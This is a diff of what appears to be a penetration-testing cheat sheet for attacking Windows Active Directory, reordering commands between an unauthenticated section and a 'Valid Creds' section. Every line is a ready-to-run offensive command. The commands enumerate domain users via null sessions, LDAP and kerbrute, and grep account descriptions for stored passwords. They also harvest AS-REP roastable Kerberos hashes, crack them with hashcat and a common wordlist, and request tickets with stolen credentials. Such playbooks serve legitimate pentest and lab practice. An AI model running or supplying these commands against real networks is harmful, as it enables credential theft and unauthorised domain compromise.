@@ -143,12 +143,11 @@ ffuf -u http://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/b
 ## Infrastructure
 nmap $TARGET --script "ldap* and not brute" -p 389 | grep -Ei 'dnsHostName' | cut -d ':' -f2 | xargs
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-windapsearch --dc-ip $TARGET --full --users --computers | grep -Evi 'bad|LastSet' | grep -Ei 'passw|pwd|key|secret|desc'
-(kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute &)
-cat *.kerbrute | grep '[+]' | cut -d ':' -f4 | cut -d '@' -f1 | xargs -n1 | tr '[:upper:]' '[:lower:]' | sort -u | tee usernames
-rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]' | tee usernames
 smbnull -i $TARGET
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
+rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]' | tee usernames
+(kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute &)
+cat *.kerbrute | grep '[+]' | cut -d ':' -f4 | cut -d '@' -f1 | xargs -n1 | tr '[:upper:]' '[:lower:]' | sort -u | tee usernames
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
 echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes; hashcat hashes $rockyou
@@ -173,6 +172,7 @@ unzip backup.zip -d .
 ) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
 
 ## Valid Creds
+windapsearch --dc-ip $TARGET -u $USERNAME -p $PASSWORD --full --users --computers | grep -Evi 'bad|LastSet' | grep -Ei 'passw|pwd|key|secret|desc'
 sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
